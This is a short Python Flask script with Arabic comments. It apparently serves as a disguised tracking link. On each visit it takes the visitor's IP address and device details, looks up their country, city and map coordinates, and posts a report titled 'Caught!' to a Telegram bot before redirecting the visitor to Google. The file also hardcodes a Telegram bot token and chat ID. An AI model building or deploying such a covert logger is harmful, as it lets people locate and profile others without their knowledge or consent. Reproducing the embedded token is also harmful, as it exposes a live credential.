import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# بياناتك الجاهزة
TELEGRAM_TOKEN = "8736814944:AAHVmQIlBQeuG4TsZcWHbcO0dI1yRs4DEFg"
CHAT_ID = "1732291841" 
DESTINATION_URL = "https://www.google.com" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

@app.route('/')
def logger():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    geo_info = "جاري جلب البيانات..."
    maps_link = ""
    try:
        res = requests.get(f"http://ip-api.com/json/{ip_address}").json()
        if res['status'] == 'success':
            geo_info = f"🌍 الدولة: {res['country']}\n🏙️ المدينة: {res['city']}"
            maps_link = f"https://www.google.com/maps?q={res['lat']},{res['lon']}"
    except: pass

    report = f"✅ **تم الصيد!**\n🌐 IP: `{ip_address}`\n{geo_info}\n📱 جهاز: `{user_agent}`\n📍 [الخريطة]({maps_link})"
    send_to_telegram(report)
    return redirect(DESTINATION_URL)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
